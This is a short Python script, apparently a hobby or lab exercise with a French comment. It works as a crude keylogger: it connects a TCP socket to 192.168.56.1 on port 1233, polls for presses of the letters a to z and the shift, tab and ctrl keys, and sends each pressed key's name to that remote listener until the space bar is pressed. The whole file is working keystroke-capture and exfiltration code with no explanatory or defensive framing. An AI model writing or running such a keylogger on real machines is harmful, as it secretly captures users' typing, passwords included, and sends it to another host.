import keyboard
import socket 



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('192.168.56.1',1233)
sock.connect(server_address)


def clavier(key):
    if keyboard.is_pressed(key):
        
        data = str(key) 
        sock.sendall(data.encode("utf8"))
        


while True: # penser à mettre la ptn de boucle si on l'enlève
    clavier('a')
    clavier('b')
    clavier('c')
    clavier('d')
    clavier('e')
    clavier('f')
    clavier('g')
    clavier('h')
    clavier('i')
    clavier('j')
    clavier('k')
    clavier('l')
    clavier('m')
    clavier('n')
    clavier('o')
    clavier('p')
    clavier('q')
    clavier('r')
    clavier('s')
    clavier('t')
    clavier('u')
    clavier('v')
    clavier('w')
    clavier('x')
    clavier('y')
    clavier('z')
    #clavier('space')
    clavier('shift')
    clavier('tab')
    clavier('ctrl')
    if keyboard.is_pressed('space'):
        break
sock.close()           
















































